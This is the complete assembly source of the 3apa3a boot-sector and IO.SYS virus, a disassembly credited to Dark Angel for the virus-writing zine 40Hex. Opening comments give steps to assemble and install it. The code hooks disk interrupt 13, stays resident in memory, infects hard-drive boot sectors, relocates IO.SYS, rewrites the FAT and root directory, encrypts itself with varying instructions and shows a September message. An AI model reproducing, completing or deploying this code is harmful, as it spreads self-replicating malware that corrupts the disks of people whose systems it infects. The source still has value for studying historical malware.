; To assemble, simple run TASM and TLINK on this file and generate a binary.
; The first 512d bytes of the binary will contain the portion of the virus
; which resides in IO.SYS. The second 512d bytes will contain the boot
; section portion of the virus.

; Installation is slightly more difficult. It requires you to simulate
; an infection with 3apa3a. Read the text above for information. Basically,
; you have to fill in the BPB in the boot sector, fill in the patch values,
; and then move the pieces onto the disk properly.

                .model  tiny
                .code
                .radix  16
                org     0
; 3apa3a virus
; Disassembly by Dark Angel of Phalcon/Skism for 40Hex Issue 14
zero:
_3apa3a:        push    cs
                call    doffset
doffset:        pop     si
                db      83,0EE,4 ; sub si,4
                push    si ax bx cx dx ds es

                mov     ah,4                    ; get date
                int     1Ah

                cmp     dh,8                    ; september?
                jne     no_activate

                lea     bx,cs:[si+message-_3apa3a]
                mov     ax,0E42                 ; begin with B
                mov     cx,endmessage - message
display_loop:   int     10                      ; print character
                add     al,cs:[bx]              ; calculate next character
                inc     bx
                loop    display_loop

no_activate:    cld
                xor     ax,ax                   ; ds = 0
                mov     ds,ax
                push    cs                      ; es = cs
                pop     es
                lea     di,[si+offset old_i13]
                push    si
                mov     si,13*4                 ; grab old int 13 handler
                movsw
                movsw
                mov     ax,ds:413               ; get BIOS memory size
                dec     ax                      ; decrease by 2K
                dec     ax
                mov     ds:413,ax               ; replace the value
                mov     cl,6                    ; convert to paragraphs
                shl     ax,cl
                mov     [si-2],ax               ; replace interrupt handler
                mov     word ptr [si-4],offset i13
                mov     es,ax                   ; move ourselves up
                push    cs
                pop     ds si
                xor     di,di
                mov     cx,200
                push    si
                rep     movsw                   ; copy now!
                inc     ch                      ; cx = 1
                sub     si,200                  ; copy rest
                rep     movsw
                pop     si
                push    cs es
                mov     ax,offset highentry
                push    ax
                retf

highentry:      mov     ax,7C0
                mov     ds,ax
                mov     word ptr ds:200,201
                mov     byte ptr ds:202,80
                les     ax,dword ptr cs:203
                mov     dx,es
                pop     es
                mov     bx,si
                mov     cx,1
                mov     word ptr cs:3C2,0FCF0   ; patch work_on_sectors to call
                call    work_on_sectors         ; do_i13
                pop     es ds dx cx bx ax
                retf

message:        db      ' ' - 'B'
                db      'B' - ' '
                db      'O' - 'B'
                db      'O' - 'O'
                db      'T' - 'O'
                db      ' ' - 'T'
                db      'C' - ' '
                db      'E' - 'C'
                db      'K' - 'E'
                db      'T' - 'K'
                db      'O' - 'T'
                db      'P' - 'O'
                db      'E' - 'P'
                db      ' ' - 'E'
                db      '-' - ' '
                db      ' ' - '-'
                db      '3' - ' '
                db      'A' - '3'
                db      'P' - 'A'
                db      'A' - 'P'
                db      '3' - 'A'
                db      'A' - '3'
                db      '!' - 'A'
                db       7  - '!'
                db      0Dh -  7
                db      10  - 0Dh
endmessage:

do_i13:         mov     ax,ds:200
                mov     dl,ds:202
                mov     byte ptr cs:patch,0EBh  ; jmp absolute
                int     13                      ; do interrupt
                mov     byte ptr cs:patch,75    ; jnz
                jc      retry_error
                cld
                retn

retry_error:    cmp     dl,80                   ; first hard drive?
                je      do_i13                  ; if so, retry
go_exit_i13:    jmp     exit_i13                ; otherwise quit

i13:            push    ax bx cx dx si di ds es bp
                mov     bp,sp
                test    dl,80                   ; hard drive?
patch:          jnz     go_exit_i13

                add     dh,cl                   ; check if working on
                add     dh,ch                   ; boot sector or
                cmp     dh,1                    ; partition table
                ja      go_exit_i13             ; if not, quit

                mov     ax,cs                   ; get our current segment
                add     ax,20                   ; move up 200 bytes
                mov     ds,ax
                mov     es,ax
                mov     word ptr ds:200,201     ; set function to read
                mov     ds:202,dl               ; set drive to hard drive
                mov     bx,400                  ; set buffer
                xor     dx,dx                   ; read in the boot sector
                push    dx
                mov     cx,1
                call    do_i13                  ; read in boot sector

                cmp     byte ptr ds:400+21,2E   ; check if 3apa3a already there
                je      go_exit_i13
                cmp     byte ptr ds:400+18,0
                je      go_exit_i13

                push    cs
                pop     es
                mov     di,203
                mov     si,403
                mov     cx,1Bh                  ; copy disk tables
                cld
                rep     movsb

                sub     si,200                  ; copy the rest
                mov     cx,1E2
                rep     movsb

                inc     byte ptr ds:201         ; set to write
                mov     ax,ds:16                ; get sectors per FAT
                mul     byte ptr ds:10          ; multiply by # FATs
                mov     bx,ds:11                ; get number of sectors
                mov     cl,4                    ; occupied by the root
                shr     bx,cl                   ; directory
                db      83,0FBh,5 ; cmp bx,5    ; at least five?
                jbe     go_exit_i13             ; if not, quit

                add     ax,bx                   ;
                add     ax,ds:0E                ; add # reserved sectors
                dec     ax                      ; drop two sectors to find
                dec     ax                      ; start of last sector
                xor     dx,dx                   ; of root directory
                push    ax dx
                call    abs_sec_to_BIOS
                mov     ds:patch1-200,cx        ; move original boot
                mov     ds:patch2-200,dh        ; sector to the end of the
                xor     bx,bx                   ; root directory
                call    do_i13
                pop     dx ax
                dec     ax
                call    abs_sec_to_BIOS

                mov     ds:34,cx ;patch3        ; write io portion to
                mov     ds:37,dh ;patch4
                add     bh,6                    ; bx = 600
                call    do_i13

                push    ds
                xor     ax,ax
                mov     ds,ax
                mov     dx,ds:46C               ; get timer ticks
                pop     ds

                mov     bl,dl                   ; eight possible instructions
                db      83,0E3,3 ; and bx,3
                push    bx
                shl     bx,1                    ; convert to word index
                mov     si,bx
                mov     cx,es:[bx+encrypt_table]
                pop     bx
                push    bx
                mov     bh,bl
                shr     bl,1                    ; bl decides which ptr to use
                lea     ax,cs:[bx+2BBE]         ; patch pointer
                mov     ds:[decrypt-bs_3apa3a],ax ; and start location
                add     ch,bl
                mov     ds:[encrypt_instr-bs_3apa3a],cx
                add     ax,0CF40
                mov     ds:[patch_endptr-bs_3apa3a],ax
                pop     ax
                push    ax
                mul     dh
                add     al,90                   ; encode xchg ax,??
                add     bl,46                   ; encode inc pointer
                mov     ah,bl
                mov     ds:[patch_incptr-bs_3apa3a],ax
                mov     dx,word ptr cs:[si+decrypt_table]
                mov     word ptr cs:decrypt_instr,dx
                pop     di
                db      83,0C7 ;add di,XX       ; start past decryptor
                dw      bs_3apa3a_decrypt - bs_3apa3a
                org     $ - 1
                mov     si,di
                push    ds
                pop     es
                mov     cx,end_crypt - bs_3apa3a_decrypt; bytes to crypt
                mov     ah,al
encrypt_loop:   lodsb
decrypt_instr:  add     al,ah
                stosb
                loop    encrypt_loop

                pop     dx
                mov     cx,1                    ; write the replacement
                xor     bx,bx                   ; boot sector to the disk
                call    do_i13
exit_i13:       mov     sp,bp
                pop     bp es ds di si dx cx bx ax
                db      0EAh
old_i13         dw      0, 0

decrypt_table:  not     al
                sub     al,ah
                add     al,ah
                xor     al,ah

encrypt_table   dw     014F6                    ; not
                dw      0480                    ; add
                dw      2C80                    ; sub
                dw      3480                    ; xor
; This marks the end of the IO.SYS only portion of 3apa3a

; The boot sector portion of 3apa3a follows.

                adj_ofs = 7C00 + zero - bs_3apa3a

bs_3apa3a:      jmp     short decrypt
                nop
                ; The following is an invalid boot sector. Replace it with
                ; yours.
                db      '        '

                db       00, 00, 00, 00, 00, 00
                db       00, 00, 00, 00, 00, 00
                db       00, 00, 00, 00, 00, 00
                db       00

decrypt:        db      0BF ; mov di,
                dw      adj_ofs + bs_3apa3a_decrypt
decrypt_loop:   db      2e ; cs:
encrypt_instr   label   word
                db      80,2Dh                  ; sub byte ptr [di],XX
patch_incptr    label   word
                db      0                       ; temporary value for cryptval
                inc     di
                db      81  ; cmp
patch_endptr    label   word
                db      0ff ; pointer
                dw      adj_ofs + end_crypt
                jne     decrypt_loop
bs_3apa3a_decrypt = $ - 1
                jmp     short enter_bs_3apa3a
                nop

load_original:  xor     dx,dx                   ; set up the read
                mov     es,dx                   ; of the original boot sector
                db      0B9 ; mov cx, XXXX
patch3          dw      3
                db      0B6
patch4          db      1
                mov     bx,ds                   ; es:bx = 0:7C00
                mov     ax,201
                db      0ebh                    ; jump to code in stack
                dw      bs_3apa3a - 4 - ($ + 1)

                org     $ - 1

enter_bs_3apa3a:cli
                xor     ax,ax
                mov     ss,ax                   ; set stack to just below us
                mov     sp,7C00
                sti
                mov     dl,80                   ; reset hard drive
                int     13

                mov     ax,2F72                 ; encode JNZ load_original at
                                                ; 7BFE
                mov     ds,sp                   ; set segment registers to
                mov     es,sp                   ; 7C00
                push    ax
                mov     word ptr ds:200,201     ; do a read
                mov     ds:202,dl               ; from the hard drive
                xor     bx,bx                   ; read to 7C00:0
                mov     dh,1                    ; read head 1
                mov     cx,1                    ; read sector 1
                                                ; (assumes active boot
                                                ; sector is here)
                mov     ax,13CDh                ; encode int 13 at 7BFC
                push    ax
                call    exec_int13              ; do the read
                mov     bx,203
                cmp     byte ptr [bx-4],0AA     ; is it valid bs?
jnz_load_original:
                jne     load_original           ; if not, assume infected and
                                                ; transfer control to it
                mov     ax,ds:13                ; get number of sectors in
                dec     ax                      ; image - 1
                cmp     ax,5103                 ; hard drive too small? (5103h
                jbe     load_original           ; sectors ~ 10.6 megs)
                mov     ax,ds:1C                ; get number hidden sectors
                add     ax,ds:0E                ; add number reserved sectors
                mov     ds:9,ax                 ; store at location that holds
                                                ; the end of OEM signature
                add     ax,ds:16                ; add sectors per FAT
                dec     ax                      ; go down two sectors
                dec     ax
                push    ax
                xor     dx,dx
                mov     cx,dx
                call    work_on_sectors         ; load end of FAT to 7C00:203
                mov     ax,ds:16                ; get sectors per FAT
                push    ax                      ; save the value
                mul     byte ptr ds:10          ; multiply by # FATs
                add     ax,ds:9                 ; calculate start of root dir
                mov     ds:7,ax                 ; store it in work buffer
                mov     cl,4
                mov     si,ds:11                ; get number sectors the
                shr     si,cl                   ; root directory takes
                add     si,ax                   ; and calculate start of data
                mov     ds:5,si                 ; area and store it in buffer
                call    work_on_sectors         ; get first 5 sectors of the
                                                ; root directory
                test    byte ptr ds:403+0Bh,8   ; volume label bit set on first
                                                ; entry? (infection marker)
jne_load_original:                              ; if so, already infected, so
                jnz     jnz_load_original       ; quit
                xor     si,si
                mov     bx,1003
                mov     ax,ds:403+1A            ; get starting cluster number
                                                ; of IO.SYS
read_IO_SYS:    push    ax                      ; convert cluster to absolute
                call    clus_to_abs_sec         ; sector number
                call    work_on_sector          ; read in one cluster of IO.SYS
                inc     si
                pop     ax

                push    bx ax
                mov     bx,403+0A00             ; read into this buffer
                push    bx
                mov     al,ah                   ; find the sector with the FAT
                xor     dx,dx                   ; entry corresponding to this
                mov     ah,dl                   ; cluster
                add     ax,ds:9
                call    work_on_sectors         ; read in the FAT
                pop     bx ax
                mov     ah,dl
                shl     ax,1
                mov     di,ax
                mov     ax,[bx+di]              ; grab the FAT entry (either EOF
                                                ; or next cluster number)
                pop     bx                      ; corresponding to this cluster
                cmp     ax,0FFF0                ; is there any more to read?
                jb      read_IO_SYS             ; if so, keep going

                inc     byte ptr ds:201         ; change function to a write
                pop     cx
                dec     cx
                dec     cx
                mov     ds:4,cl
                mov     di,401                  ; scan the end of the FAT
                mov     cx,100
                mov     bp,-1
copy_IO_SYS:    xor     ax,ax                   ; look for unused clusters
                repne   scasw
                jnz     jne_load_original
                mov     [di+2],bp
                mov     bx,cx
                mov     bh,ds:4
                mov     bp,bx                   ; save starting cluster of
                push    bp cx                   ; where IO.SYS will be moved
                mov     ah,ds:0Dh
                shl     ax,1
                dec     si
                mul     si
                mov     bx,ax
                add     bx,1003
                mov     ax,bp
                call    clus_to_abs_sec
                call    work_on_sector          ; move IO.SYS to end of HD
                pop     cx bp
                or      si,si
                jnz     copy_IO_SYS

                mov     si,0DE1                 ; move all but the first two
                mov     di,0E01                 ; directory entries down one
                mov     cx,4D0                  ; (10 dir entries / sector,
                rep     movsw                   ;  5 sectors)
                                                ; DF set by exec_int13
                mov     si,421                  ; move IO.SYS entry down two
                mov     cx,10                   ; entries
                rep     movsw

                mov     ds:400+2*20+1Dh,bp      ; set starting cluster of the
                                                ; moved original IO.SYS
                or      byte ptr ds:40E,8       ; set volume label bit on first
                                                ; IO.SYS entry
                mov     bx,403                  ; point to root directory
                mov     ax,ds:7                 ; get starting cluster of
                xor     dx,dx                   ; root dir
                mov     cl,4
                call    work_on_sectors         ; write updated root directory
                pop     ax                      ; to the disk
write_FATs:     mov     bx,203                  ; point to the updated FAT
                call    work_on_sectors         ; write changed end of FAT

                dec     ax
                add     ax,ds:16                ; add sectors per FAT
                dec     byte ptr ds:10          ; processed all the FATs?
                jnz     write_FATs

                mov     ax,bp
                call    clus_to_abs_sec
                mov     cs:7C03,ax              ; store the values
                mov     cs:7C05,dx
                mov     byte ptr cs:7C01,1Ch

                xor     ax,ax                   ; reset default drive
                mov     dx,ax
                int     13

                mov     ax,201                  ; read in original boot sector
; You must patch the following values if you are installing 3apa3a on a disk
                db      0b9 ; mov cx, XXXX
patch1          dw      0
                db      0b6 ; mov dh, XX
patch2          db      0
                mov     bx,0E03
                call    perform_int13

                mov     ax,ds:403+1A            ; get starting cluster number
                call    clus_to_abs_sec         ; of IO.SYS
                xor     cx,cx
                call    work_on_sectors
                mov     bx,ds
                mov     es,cx
                call    work_on_sectors
go_load_original:
                jmp     load_original

exec_int13:     mov     ax,ds:200               ; get function from memory
                mov     dl,ds:202               ; get drive from memory
perform_int13:  int     13
                jc      go_load_original
                std
                retn

work_on_sectors:inc     cx
work_on_sector: push    cx dx ax
                call    abs_sec_to_BIOS
                call    exec_int13
                pop     ax dx cx
                add     ax,1                    ; calculate next sector
                db      83,0D2,0 ; adc dx,0     ; (don't use INC because
                add     bh,2                    ; INC doesn't set carry)
                loop    work_on_sector          ; do it for the next sector

                retn

abs_sec_to_BIOS:div     word ptr ds:18          ; divide by sectors per track
                mov     cx,dx
                inc     cl
                xor     dx,dx
                div     word ptr ds:1A          ; divide by number of heads
                ror     ah,1
                ror     ah,1
                xchg    ah,al
                add     cx,ax
                mov     dh,dl
                retn

clus_to_abs_sec:mov     cl,ds:0Dh               ; get sectors per cluster
                xor     ch,ch                   ; (convert to word)
                dec     ax
                dec     ax
                mul     cx                      ; convert cluster number to
                add     ax,ds:5                 ; absolute sector number
end_crypt:      db      83,0D2,0 ; adc dx,0
                retn

                dw      0AA55                   ; boot signature

                end     _3apa3a

